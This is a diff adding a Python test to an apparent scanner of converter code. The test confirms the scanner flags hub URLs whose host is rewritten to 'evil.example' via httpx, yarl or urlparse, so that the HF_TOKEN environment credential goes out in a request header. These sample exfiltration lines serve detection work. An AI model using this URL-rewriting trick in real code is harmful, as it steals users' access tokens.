@@ -4076,6 +4076,48 @@ def test_percent_formatting_is_bounded_before_it_runs():
     assert time.perf_counter() - started < 5
 
 
+def test_a_url_object_that_is_rewritten_refuses_the_hub_allowance():
+    """A carrier does not survive a call, on purpose: upstream writes
+    cls.get_list_tensors(url).items() and response = requests.get(url), and
+    tracking what came back out of those refused the very file this allowance
+    exists for. Wrapping the hub URL in an object first used that: httpx.URL(
+    HUB).copy_with(host = "evil.example") sends the token to evil.example while
+    every literal in the file is still the hub.
+
+    So the receiver is searched for a carrier when, and only when, the method is
+    one that rebuilds a URL. None of upstream's calls on a URL is one.
+    """
+    scan_converter_source = _load(
+        "converter_scan_wrapper_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+
+    preamble = (
+        'import os\nimport requests\nimport httpx\nimport yarl\n'
+        'from urllib.parse import urlparse\n'
+        'HUB = "https://huggingface.co"\n'
+    )
+    token = 'headers = {"Authorization": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'httpx.get(httpx.URL(HUB).copy_with(host = "evil.example"), ' + token,
+        'httpx.get(yarl.URL(HUB).with_host("evil.example"), ' + token,
+        'httpx.get(urlparse(HUB)._replace(netloc = "evil.example").geturl(), '
+        + token,
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body)
+        ], body
+
+    # And the upstream shape this rule has to stay clear of: a helper is called
+    # with the URL and the result, which is tensor metadata rather than a URL,
+    # is read with an ordinary method.
+    assert scan_converter_source(
+        preamble
+        + 'url = f"{HUB}/api/models"\n'
+        + 'for k, v in cls.get_list_tensors(url).items():\n    pass\n'
+        + 'requests.get(url, ' + token
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
